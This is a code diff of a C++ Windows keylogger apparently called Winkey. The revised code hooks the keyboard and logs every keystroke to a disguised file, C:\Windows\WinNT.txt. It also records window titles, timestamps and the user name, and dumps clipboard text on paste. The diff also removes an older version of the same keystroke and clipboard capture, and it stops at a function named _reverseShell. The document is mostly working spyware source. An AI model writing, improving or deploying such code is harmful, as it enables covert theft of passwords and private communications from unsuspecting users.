@@ -1,10 +1,7 @@
 #include "Winkey.hpp"
 
-HHOOK hHock = NULL;
-HWND currWindow;
-HWND lastWindow = NULL;
-bool shift_k = false;
-char title[256];
+HHOOK			key_hook;
+HWINEVENTHOOK	win_hook;
 
 FILE* file;
 
@@ -18,133 +15,112 @@ Winkey::~Winkey(void)
 	return;
 }
 
-void getTime(char** timebuff) {
-	time_t ltime;
-	struct tm  tstruct;
-	char buff[80];
-	ltime = time(0);
-	tstruct = *localtime(&ltime);
-	strftime(buff, sizeof(buff), "%d-%m-%Y %X", &tstruct);
-	strcpy(*timebuff, buff);
-}
-
-// Define a mapping of virtual key codes to their string representations
-const std::unordered_map<DWORD, std::string> keyMap = {
-	{0x41, "A"}, {0x42, "B"}, {0x43, "C"}, {0x44, "D"}, {0x45, "E"}, {0x46, "F"}, {0x47, "G"}, {0x48, "H"}, {0x49, "I"}, {0x4A, "J"},
-	{0x4B, "K"}, {0x4C, "L"}, {0x4D, "M"}, {0x4E, "N"}, {0x4F, "O"}, {0x50, "P"}, {0x51, "Q"}, {0x52, "R"}, {0x53, "S"}, {0x54, "T"},
-	{0x55, "U"}, {0x56, "V"}, {0x57, "W"}, {0x58, "X"}, {0x59, "Y"}, {0x5A, "Z"},
-	{VK_SLEEP, "[SLEEP]"},
-	{VK_NUMPAD0, "0"}, {VK_NUMPAD1, "1"}, {VK_NUMPAD2, "2"}, {VK_NUMPAD3, "3"}, {VK_NUMPAD4, "4"}, {VK_NUMPAD5, "5"}, {VK_NUMPAD6, "6"},
-	{VK_NUMPAD7, "7"}, {VK_NUMPAD8, "8"}, {VK_NUMPAD9, "9"}, {VK_MULTIPLY, "*"}, {VK_ADD, "+"}, {VK_SEPARATOR, "-"}, {VK_SUBTRACT, "-"},
-	{VK_DECIMAL, "."}, {VK_DIVIDE, "/"},
-	{VK_BACK, ""}, {VK_TAB, "\\t"}, {VK_RETURN, "\\n"}, {VK_SHIFT, "Shift"}, {VK_LCONTROL, "Ctrl+"}, {VK_RCONTROL, "Ctrl+"},
-	{VK_SPACE, " "},
-	{0x30, "1"}, {0x31, "2"}, {0x32, "3"}, {0x33, "4"}, {0x34, "5"}, {0x35, "6"}, {0x36, "7"}, {0x37, "8"}, {0x38, "9"}, {0x39, "0"},
-	{VK_OEM_1, ";"}, {VK_OEM_PLUS, "+"}, {VK_OEM_COMMA, ","}, {VK_OEM_MINUS, "-"}, {VK_OEM_PERIOD, "."}, {VK_OEM_2, "/"},
-	{VK_OEM_3, "`"}, {VK_OEM_4, "["}, {VK_OEM_5, "\\"}, {VK_OEM_6, "]"}, {VK_OEM_7, "'"}
-	// Add more key mappings as needed
-};
-
-std::string HookCode(DWORD code, BOOL caps, BOOL shift)
+void	handle_sig(int sig)
 {
-    std::string key;
-    auto it = keyMap.find(code);
-    if (it != keyMap.end()) {
-        key = it->second;
-        if (caps && !shift) {
-            // Convert to uppercase if Caps Lock is on and Shift is not pressed
-            for (char& c : key) {
-                c = static_cast<char>(std::toupper(static_cast<unsigned char>(c)));
-            }
-        }
-        else if (shift && !caps) {
-            // Convert to uppercase if Shift is pressed and Caps Lock is off
-            for (char& c : key) {
-                c = static_cast<char>(std::toupper(static_cast<unsigned char>(c)));
-            }
-        }
-    }
-    else {
-        // Handle unknown key codes
-        key = "[UNK-KEY]";
-    }
-    return key;
+    (void)sig;
+    UnhookWindowsHookEx(key_hook);
+    UnhookWinEvent(win_hook);
 }
 
-LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
-    bool caps = false;
-    int capsShort = GetKeyState(VK_CAPITAL);
-    char* timebuf = (char*)malloc(sizeof(char) * 80);
-	char	username[256];
-	
-	
-	file = fopen("C:\\Windows\\WinNT.txt", "a");
+void	_clipboard(void)
+{
+    FILE* log;
+    HGLOBAL	clip;
+    LPVOID str;
 
-
-    if (capsShort)
+    if (!OpenClipboard(0))
+        return;
+    clip = GetClipboardData(CF_TEXT);
+    if (clip)
     {
-        caps = TRUE;
-    }
-    std::string buffer;
-    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
-    if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
-        if (wParam == WM_KEYDOWN)
+        str = GlobalLock(clip);
+        if (str)
         {
-            shift_k = TRUE;
+            fopen_s(&log, "C:\\Windows\\ClipBoard.txt", "a");
+            fprintf_s(log, "\n{CLIPBOARD: %s}\n", str);
+            fclose(log);
         }
+        GlobalUnlock(clip);
+    }
+    CloseClipboard();
+}
+
+LRESULT CALLBACK	LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    PKBDLLHOOKSTRUCT	key = (PKBDLLHOOKSTRUCT)lParam;
+    static char			shift = 0;
+    FILE* log;
+
+    if (nCode == HC_ACTION)
+    {
         if (wParam == WM_KEYUP)
         {
-            shift_k = FALSE;
+            if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
+                shift = 0;
         }
-        else
+        if (wParam == WM_KEYDOWN)
         {
-            shift_k = FALSE;
+            if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
+                shift = 1;
+            fopen_s(&log, "C:\\Windows\\WinNT.txt", "a");
+            fprintf_s(log, "%s", keys[shift][key->vkCode]);
+            fclose(log);
+            if (GetKeyState(VK_CONTROL) && key->vkCode == 'V')
+                _clipboard();
         }
     }
-    if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
-    {
-        currWindow = GetForegroundWindow();
-        if (currWindow != lastWindow) {
-            GetWindowText(currWindow, title, sizeof(title));
-            DWORD userNameSize = sizeof(username);
-			GetUserNameA(
-				username,
-                &userNameSize
-			);
-            getTime(&timebuf);
-            buffer.clear();
-            buffer.append("\n[ ");
-            buffer.append(timebuf);
-            buffer.append(" ] - ");
-			buffer.append(username);
-            buffer.append(" '");
-            buffer.append(title);
-            buffer.append("'\n");
-            lastWindow = currWindow;
-        }
-        if (p->vkCode) {
-            buffer.append(HookCode(p->vkCode, caps, shift_k));
-        }
-    }
-    fprintf(file, "%s", buffer.data());
-    fclose(file);
-    buffer.clear();
-    free(timebuf);
+    return (CallNextHookEx(key_hook, nCode, wParam, lParam));
+}
 
-    return CallNextHookEx(hHock, nCode, wParam, lParam);
+void CALLBACK	Wineventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
+    LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
+{
+    SYSTEMTIME	time;
+    int			len;
+    HLOCAL title;
+    FILE* log;
+
+    (void)hWinEventHook;
+    (void)idObject;
+    (void)idChild;
+    (void)idEventThread;
+    (void)dwmsEventTime;
+    if (event != EVENT_SYSTEM_FOREGROUND)
+        return;
+    len = GetWindowTextLength(hwnd) + 1;
+    title = LocalAlloc(LMEM_ZEROINIT, len);
+    if (!title)
+        return;
+    GetSystemTime(&time);
+    GetWindowText(hwnd, LPSTR(title), len);
+    if (!title)
+        return;
+
+    WCHAR username[256];
+    DWORD usernameLen = sizeof(username) / sizeof(username[0]);
+    GetUserNameW(username, &usernameLen);
+
+    fopen_s(&log, "C:\\Windows\\WinNT.txt", "a+");
+    fprintf_s(log, "\n[%02d.%02d.%d %02d:%02d:%02d] - %ls - '%s'\n", time.wDay,
+        time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond, username, title);
+    fclose(log);
+    LocalFree(title);
 }
 
 DWORD WINAPI _keyLogger(LPVOID lpParam)
 {
-	(void)lpParam;
+    (void)lpParam;
 
-    MSG msg;
-    hHock = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, NULL, NULL);
-    while (GetMessage(&msg, NULL, 0, 0) > 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
+    MSG		msg;
+    HANDLE	thread;
+
+    //signal(SIGINT, handle_sig);
+    key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
+    win_hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0,
+        Wineventproc, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
+    CloseHandle(thread);
+    while (GetMessage(&msg, 0, 0, 0));
+
     return 0;
 }
 
@@ -156,62 +132,11 @@ void	Winkey::startKeylogger(void)
 	return;
 }
 
-DWORD WINAPI _clipboard(LPVOID lpParam)
-{
-    (void)lpParam;
-    FILE* log = nullptr;
-    HGLOBAL clip = nullptr;
-    LPVOID str = nullptr;
-    char* prevClipboardData = nullptr;
 
-
-
-    while (true) {
-        if (!OpenClipboard(0))
-            return 0;
-        // Check for clipboard changes at regular intervals (e.g., every second)
-
-
-        clip = GetClipboardData(CF_TEXT);
-        if (clip) {
-            str = GlobalLock(clip);
-            if (str) {
-                // Check if clipboard data has changed
-                if (prevClipboardData == nullptr || strcmp(static_cast<const char*>(str), prevClipboardData) != 0) {
-                    // Data has changed, log it
-                    fopen_s(&log, "C:\\Windows\\ClipBoard.txt", "a+");
-                    if (log) {
-                        fprintf_s(log, "\n{CLIPBOARD: %s}\n", str);
-                        fclose(log);
-                    }
-
-                    // Update the previous clipboard data
-                    if (prevClipboardData != nullptr) {
-                        delete[] prevClipboardData;
-                    }
-                    prevClipboardData = new char[strlen(static_cast<const char*>(str)) + 1];
-                    strcpy_s(prevClipboardData, strlen(static_cast<const char*>(str)) + 1, static_cast<const char*>(str));
-                }
-            }
-            GlobalUnlock(clip);
-        }
-        CloseClipboard();
-        Sleep(10000000);
-    }
-
-    // Cleanup (this part won't be reached in the loop)
-    if (prevClipboardData != nullptr) {
-        delete[] prevClipboardData;
-    }
-
-    return 0;
-}
 
 void    Winkey::startclipBoard(void)
 {
-    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_clipboard), NULL, 0, NULL) == NULL) {
-        std::cerr << "CreateThread failed!" << std::endl;
-    }
+    return;
 }
 
 DWORD WINAPI _reverseShell(LPVOID lpParam)
